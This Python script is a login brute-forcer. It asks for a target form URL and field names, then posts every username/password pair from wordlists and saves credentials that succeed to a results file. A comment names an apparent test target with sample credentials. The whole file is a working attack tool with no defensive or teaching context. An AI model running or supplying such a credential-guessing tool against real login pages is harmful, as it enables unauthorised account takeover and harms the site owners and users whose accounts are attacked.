import requests
from lxml import html
from sys import exit


#For Testing try:
#http://grabme.herokuapp.com/target/
#sanix
#.bleach1234

def open_ressources(file_path):
    return [item.replace("\n", "") for item in open(file_path).readlines()]


INCORRECT_MESSAGE = open_ressources('incorrectMessage.txt')
SUCCESS_MESSAGE = open_ressources('successMessage.txt')
PASSWORDS = open_ressources('passwords.txt')
USERS = open_ressources('users.txt')





url = input("\n[+] Enter the target URL (it's the 'action' attribute on the form tag):")
user_field = input("\n[+] Enter the User Field  (it's the 'name' attribute on the Login form for the username/email):")
password_field = input("\n[+] Enter the Password field  (it's the 'name' attribute on the Login form for the password):")

print("[+] Connecting to: " + url + "......\n")
failed_aftertry = 0
for user in USERS:

	for password in PASSWORDS:

		result = requests.get(url)
		tree = html.fromstring(result.text)
		payload = {user_field: user.replace('\n', ''), password_field:password.replace('\n', '')}
		request = requests.post(url, data=payload)


		if INCORRECT_MESSAGE[0] in request.text or INCORRECT_MESSAGE[1] in request.text:
			print("[+] Failed to connect with:\n user: " + user + " and password: " + password)
		else:
			if SUCCESS_MESSAGE[0] in request.text or SUCCESS_MESSAGE[1] in request.text:
				result = "\n[+] --------------------------------------------------------------"
				result += "\n[+] \nTheese Credentials succeed to LogIn:\n> username: " + user + " and password: " + password
				result += "\n[+] --------------------------------------------------------------\n"
				with open("./results.txt", "w+") as frr:
					frr.write(result)
				print("The Password for '" + user + "' is:\t" + password + "'.\nThe results have been saved in ./results.txt")
				exit()
			else:
				print("Trying username as:\t'" + user + "' and password as:\t'" + password + "'")

